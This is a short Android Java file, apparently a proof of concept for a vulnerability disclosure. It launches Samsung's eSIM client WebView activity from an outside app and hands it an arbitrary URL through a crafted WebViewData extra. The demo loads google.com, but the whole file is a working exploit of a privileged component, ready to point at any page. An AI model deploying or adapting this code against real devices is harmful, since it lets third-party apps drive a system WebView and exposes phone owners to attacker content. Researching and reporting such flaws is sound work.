package poc.app;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

import com.samsung.oda.lib.message.data.HttpMethod;
import com.samsung.oda.lib.message.data.WebViewData;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        WebViewData data = new WebViewData();
        data.mMethodType = HttpMethod.GET;
        data.mUrl = "https://google.com/";

        Intent i = new Intent();
        i.setClassName("com.samsung.android.app.telephonyui.esimclient", "com.samsung.android.app.telephonyui.esimclient.OdaWebViewActivity");
        i.putExtra("WebViewData", data);
        startActivity(i);
    }
}